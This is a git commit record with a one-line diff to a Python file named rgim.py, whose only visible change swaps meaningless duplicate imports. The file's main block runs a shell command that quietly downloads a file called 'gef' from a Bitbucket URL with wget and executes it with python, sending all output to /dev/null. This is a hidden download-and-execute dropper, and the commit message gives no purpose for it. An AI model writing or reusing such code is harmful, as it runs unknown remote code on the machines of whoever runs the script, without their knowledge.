66cfa0ffacd55038669767cddd55b680582c93b8
gakira munshi <gakimarki@proton.me>
2024-12-18 06:54:58 -0500

    Abandon all hope, ye who enter here.

--- rgim.py
+++ rgim.py
@@ -1,3 +1,3 @@
-import os, secrets,secrets
+import os, copy,copy
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
